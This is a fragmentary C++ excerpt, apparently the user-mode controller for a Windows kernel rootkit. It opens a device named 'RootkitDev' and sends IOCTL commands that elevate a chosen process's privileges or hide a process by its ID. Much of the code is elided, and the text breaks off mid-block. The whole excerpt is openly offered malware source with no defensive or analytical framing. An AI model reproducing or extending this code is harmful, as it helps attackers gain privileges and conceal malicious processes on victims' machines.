...
constexpr auto DeviceName = L"\\\\.\\RootkitDev";
...
bool SendDeviceCommand(HANDLE hDevice, RootkitIoctls command, ParametersFromUser params) {
	DWORD ret;
...
int main(int argc, const char* argv[]) {
	...
	if (!strcmp("elevate", argv[1])) {
		...
		if (SendDeviceCommand(hDevice, RootkitIoctls::Elevate, params)) {
			printf("Successfully sent Elevate command for pid: %ld\n", pid);
		}
	}
	else if (!strcmp("hide", argv[1])) {
		printf("Hiding process with id: %ld\n", pid);
		if (SendDeviceCommand(hDevice, RootkitIoctls::HideProcces, params)) {
